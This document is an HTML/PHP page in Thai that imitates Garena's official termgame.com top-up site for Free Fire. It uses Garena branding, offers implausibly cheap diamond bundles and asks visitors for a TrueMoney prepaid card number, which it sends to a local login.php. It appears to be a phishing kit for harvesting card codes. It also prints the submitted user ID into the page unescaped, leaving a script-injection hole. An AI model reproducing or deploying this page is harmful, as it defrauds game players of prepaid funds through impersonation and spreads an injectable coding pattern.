<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta key="description" name="description" content="เว็บเติมเงินเกมการีนาอย่างเป็นทางการ ไม่ว่าจะเป็นการเติมเชล, ROV, Blade and Soul, BreakOut, HoN, LOL, PB, FO3, Headshot, และเกมอื่นๆของการีนา ครอบคลุมทุกช่องทาง สะดวก และปลอดภัย" data-react-helmet="true">
    <meta key="keywords" name="keywords" content="garena, การีนา, garena shells, shells, การีนาเชลล์, เติมเชลล์, บัตรเติมเงินการีนา, โค้ดเกมการีน่า, mshop, LoL, Heroes of Newerth, HoN, Point Blank,  FIFA Online 3, FO3,  FIFA Online 3 Mobile, FO3M,  RoV, BreakOut, เบรคเอาท์, Blade and Soul, BNS, เบลด แอน โซล" data-react-helmet="true">
    <title>Free Fire - termgame.com - ศูนย์เติมเงินเกม Garena</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webth/garena/logo-garena-white-icon-32.png">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <!-- sweetalert -->
    <link rel="stylesheet" href="dist/bootstrap.min.css">
    <link rel="stylesheet" href="dist/styles.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Kanit:300">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css">
    <script src="dist/jquery.min.js"></script>
    <script src="dist/bootstrap.min.js"></script>
    <script src="dist/sweetalert.min.js"></script>
    <script src="dist/script.js"></script>
    <!--  -->
  </head>
  <body>
    <div class="container" style="text-align: left;">
      <nav class="nav-bar">
        <div class="logo-garena">
          <img class="logo" src="https://sso.garena.com/images/img_garena_logo.png" alt="Garena Free fire" style="width:111px; height:31px;">
        </div>
        <div class="img-icon">
          <div class="content">
            <img class="icon-uid" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png" alt="Garena Free fire" style="width:24px; height:24px;">
            <div class="text-uid"><strong>ID : <?php echo $_POST['uid']; ?></strong></div>
          </div>
        </div>
      </nav>
      <br>
      <section>
        <div class="logo-truemoney">
          <img class="true-money" src="https://cdngarenanow-a.akamaihd.net/webmain/static/payment_center/th/menu/icon_truemoney_w.png">
          <div style="background-color: #dc3545; height: 2px; width: 150px;"></div>
        </div>
        <div class="list">
          <div><h6><strong>เติมเงินผ่านบัตร True Money</strong></h6></div>
        </div>
        <div class="t" style="color: #dc3545;">* จำกัด 1 ครั้งต่อ 1 ไอดี </div>
        <br>
        <div class="text-content">
          <table>
            <tr>
              <th style="color: #dc3545;">ราคา</th>
              <th style="color: #dc3545;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;แต้ม app</th>
            </tr>
            <tr>
              <td>฿ 20</td>
              <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diamond x 220</td>
            </tr>
            <tr>
              <td>฿ 50</td>
              <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diamond x 340 <span style="color: #dc3545;">(1 ครัง ต่อ ไอดี)</td>
            </tr>
            <tr>
              <td>฿ 90</td>
              <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diamond x 410</td>
            </tr>
            <tr>
              <td>฿ 150</td>
              <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diamond x 530</td>
            </tr>
            <tr>
              <td>฿ 300</td>
              <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diamond x 1020</td>
            </tr>
          </table>
        </div>
        <br>
        <div>
          <div>
            <div><strong>* ใส่ข้อมูลบัตร truemoney</strong></div>
            <div>
              <div>
                <div>
                  <br>
                  <div>หมายเลขบัตร truemoney</div>
                </div>
                <div>
                  <div>
                    <form action="login.php" method="post">
                      <input type="text" name="truemoney" id="inumber" placeholder="หมายเลขบัตร truemoney (14 หลัก)" maxlength="14" autocorrect="off" autocapitalize="off" required>
                      <div>
                        <br>
                        <div>
                          <input id="btnClick" style="margin-left: 0px;" type="submit" value="ยืนยัน" class="btn btn-danger">
                          <br>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
            <br>
          </div>
        </div>
      </section>
    </div>
  </body>
</html>
